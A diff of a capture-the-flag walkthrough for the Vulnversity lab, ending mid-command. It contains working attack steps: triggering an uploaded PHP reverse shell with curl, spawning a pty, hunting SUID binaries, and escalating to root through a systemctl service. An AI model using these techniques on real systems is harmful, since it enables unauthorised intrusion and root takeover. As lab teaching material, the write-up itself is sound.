@@ -116,18 +116,54 @@ nc -lnvp 9001
 ````
 We now upload the file directly to the _/internal/upload_ folder and run it from the browser by clicking or by using a curl command.
 ```
-curl ttp://10.10.74.180:3333/internal/uploads/php-reverse-shell.phtml
+curl http://<IP>:3333/internal/uploads/php-reverse-shell.phtml
 ```
-This now gives us access to a reverse shell. We can create a proper interactive shell by:
+<br>
+<br>
+<img src="../images/curl.png" alt="content disposition" width="300"/>
+<br>
+<br>
+
+This now gives us access to a reverse shell.
+<br>
+<br>
+<img src="../images/reverse_shell.png" alt="content disposition" width="300"/>
+<br>
+<br>
+We can create a more interactive shell by:
 ```
 python -c 'import pty;pty.spawn("/bin/bash")'
 ```
-We cannot access sudo permissions so let us look at SUID bit escalation:
+Lets search for the user flag. SImple enough to find.check out ?home for users, where we find Bill. Check his folder structure and we find the user.txt.
+```
+www-data@vulnuniversity:/$ cd home
+cd home
+www-data@vulnuniversity:/home$ ls
+ls
+bill
+www-data@vulnuniversity:/home$ cd bill
+cd bill
+www-data@vulnuniversity:/home/bill$ ls
+ls
+user.txt
+www-data@vulnuniversity:/home/bill$ cat user.txt
+```
+## privilage escalation
+First we try to access a list of sudo permissions by sudo -l. 
+
+```
+$ sudo -l                                                                         │
+sudo: no tty present and no askpass program specified```
+```
+No luck here, but we also don't know the password for Bill, so let us look at SUID bit escalation:
 ```
 find / -perm -4000 2>/dev/null
 ```
-Using GTFObins we can see that there are two options for systemctl as SUID and sudo
+Look through the files to see if something is unusual or stands out. I normally check this against my own host. In this case it is unusual to find /bin/systemctl. 
 
+Using GTFObins we can see that there are two options for systemctl as SUID and sudo. 
+
+If we look at the code, in this case the "id" can be amended to be one of two things. As we know from the question the location of the root flag, we could use that as the first attempt. Second is the availability of a root bash shell, discussed below.
 ```
 TF=$(mktemp).service
 echo '[Service]
@@ -137,21 +173,13 @@ WantedBy=multi-user.target' > $TF
 /bin/systemctl link $TF
 /bin/systemctl enable --now $TF
 ```
-* TF=$(mktemp).service: we will create a new environment variable called “TF” (the name can be anything). Next, we will be using the mktemp command to create a new temporary file as a system service file.
-* echo '[Service]: use the echo command to enter an input into the system. The single quote (‘) will allow us to enter into multi-line mode so we can enter the rest of the commands.
-* Type=oneshot: declare the service as oneshot, which means that the service will execute the action and then immediately exit.
-* ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/output": when the service starts, use the sh command to execute (-c) everything inside the double quotes. This will send the results of the command “/root/root.txt” into a file named output in the tmp directory.
-* [Install]: denotes the second part of our system services file.
-* WantedBy=multi-user.target' > $TF: set the service to run once it reaches a certain runlevel. Multi-user.target is runlevel 3, while a functional Linux OS with GUI is runlevel 5. This dependency input and everything before is then redirected into the TF variable. The single quote after target is to denote the end of our echo entry.
-* Systemctl link $TF: link the TF variable to systemctl so it can be executed by systemctl even though it’s in a different path from other service files.
-* systemctl enable --now $TF: enable the service file stored in the TF variable immediately. It will reload the system manager to ensure the changes are in effect.
+If you would like to get a better understanding of the code, then [Wuggles](https://unicornsec.com/home/tryhackme-vulnversity) is an interesting read.
 
 Then just read the root flag file:
 ```
 cat /tmp/output
 ```
-
-We can also escalate to a bash shell with a slighyt change of command.
+We can also escalate to a bash shell with a slight change of "id".
 ```
 eop=$(mktemp).service
 echo '[Service]
